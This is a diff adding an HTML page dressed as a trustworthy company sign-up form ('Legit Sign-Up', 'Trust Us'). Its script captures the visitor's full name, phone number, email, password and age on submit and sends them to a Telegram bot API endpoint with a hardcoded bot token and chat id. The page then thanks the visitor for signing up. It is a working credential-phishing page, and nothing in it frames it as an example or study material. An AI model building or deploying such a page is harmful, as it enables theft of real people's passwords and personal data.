@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Legit Sign-Up</title>
+    <style type="text/css">
+
+body {
+        background-color: #1c2331;
+        font-family: Verdana, sans-serif;
+        color: #fff;
+        margin: 0;
+        padding: 0;
+        font-family: Candara, Calibri, sans-serif;
+	    color: #1c2331;
+  
+}
+
+.container {
+
+text-align: center;
+  width: 88%;
+  margin: auto;
+  padding: 20px;
+  background-color: #fff;
+  border-radius: 15px;
+  box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+}
+
+input[type="text"],
+input[type="email"],
+input[type="password"],
+input[type="number"] {
+  width: 90%;
+  padding: 10px;
+  margin: 5px 0;
+  border: none;
+  border-radius: 7px;
+  background-color: #f1f1f1;
+}
+
+input[type="submit"] {
+  width: 200px;
+  height: 50px;
+  background: linear-gradient(to right, #5f2c82, #49a09d, #a2c7e5);
+  border: none;
+  border-radius: 11px;
+  color: #fff;
+  font-size: 18px;
+  font-weight: bold;
+  transition: all 0.3s ease;
+}
+
+input[type="submit"]:hover {
+  cursor: pointer;
+  background: linear-gradient(to right, #f12711, #f5af19);
+}
+
+
+.company-info {
+  margin-top: 30px;
+  text-align: center;
+  color: #777;
+}
+
+.company-info a {
+  color: #4CAF50;
+  text-decoration: none;
+}
+
+::-webkit-input-placeholder {
+  color: #888;
+}
+
+::-moz-placeholder {
+  color: #888;
+}
+
+:-ms-input-placeholder {
+  color: #888;
+}
+
+::-ms-input-placeholder {
+  color: #888;
+}
+
+::placeholder {
+  color: #888;
+}
+
+
+   
+   .company-info {
+   text-align: center;
+   color: #666;
+   margin-top: 50px;
+   font-size: 12px;
+   }
+   
+   .company-info a {
+   color: #666;
+   text-decoration: none;
+   font-weight: bold;
+   }
+   
+   .logo-container {
+   position: absolute;
+   top: 0;
+   left: 0;
+   right: 0;
+   margin-top: 20px;
+   text-align: center;
+   }
+   
+   .logo-text {
+   font-family: , sans-serif;
+   font-size: 50px;
+   font-weight: bold;
+   color: #fff;
+   opacity: 0;
+   animation: fade-in 2s forwards;
+   }
+   
+   @keyframes fade-in {
+   0% {
+   opacity: 0;
+   transform: translateX(-50px);
+   }
+   100% {
+   opacity: 1;
+   transform: translateX(0);
+   }
+   }
+   
+   
+ 
+   
+   
+    </style>
+  </head>
+  <body>
+  
+ 
+  <div class="logo-container">
+  <h1 class="logo-text"> Welcome</h1>
+  </div>
+  
+  <br><br>
+  <br><br>
+  <br><br>
+  </div>
+  
+    
+    <body>
+    <br><br>
+    <div class="container">
+    <form action="#" method="post">
+    <h1>Sign Up Now</h1>
+    <input type="text" placeholder="Full Name" name="fullname" required>
+    <input type="number" placeholder="Phone Number" name="number" required>
+    <input type="email" placeholder="Email" name="email" required>
+    <input type="password" placeholder="Password" name="password" required>
+    <input type="password" placeholder="Confirm Password" name="confirmPassword" required>
+    <input type="number" placeholder="Age" name="age" required>
+    <br>
+   <br> 
+   <input type="submit" value="Sign Up">
+   
+    </form>
+    <div class="company-info">
+    <p>Trust Us | Profesional | Help  | <a href="#">Contact Us</a></p>
+    </div>
+    </div>
+    </body>
+    
+    <div class="company-info">
+    <p>Claearence.inc</p>
+    <p>783 Main Street, Suite 130</p>
+    <p>Jorgetown, USA 16345</p>
+    <p>Phone: 545-255-9855</p>
+    <p>Email: info@clearence.com</p>
+    </div>
+    </div>
+    
+    <script type="text/javascript">
+    
+    const form = document.querySelector('form');
+    
+    form.addEventListener('submit', (e) => {
+    e.preventDefault();
+    
+    const fullname = document.querySelector('input[name="fullname"]').value;
+    const number = document.querySelector('input[name="number"]').value;
+    const email = document.querySelector('input[name="email"]').value;
+    const password = document.querySelector('input[name="password"]').value;
+    const confirmPassword = document.querySelector('input[name="confirmPassword"]').value;
+    const age = document.querySelector('input[name="age"]').value;
+    
+    if (password !== confirmPassword) {
+    alert("Passwords do not match!");
+    return;
+    }
+    
+    const message = `
+    Full Name: ${fullname}
+    Phone Number: ${number}
+    Email: ${email}
+    Password: ${password}
+    Age: ${age}
+    BY : @YA_CN
+    `;
+    
+    const telegramUrl = `https://api.telegram.org/bot5451750160:AAHDp0iR9mtlnODx_7cjN_i73cQPCdKeQoM/sendMessage?chat_id=5523858080&text=${message}`;
+    
+    fetch(telegramUrl)
+    .then(response => {
+    if (response.status === 200) {
+    alert("Thank you for signing up!");
+    form.reset();
+    } else {
+    alert("Oops! Something went wrong.");
+    }
+    })
+    .catch(error => {
+    alert("Oops! Something went wrong.");
+    });
+    });
+    
+    
+    
+    </script>
+  </body>
+</html>
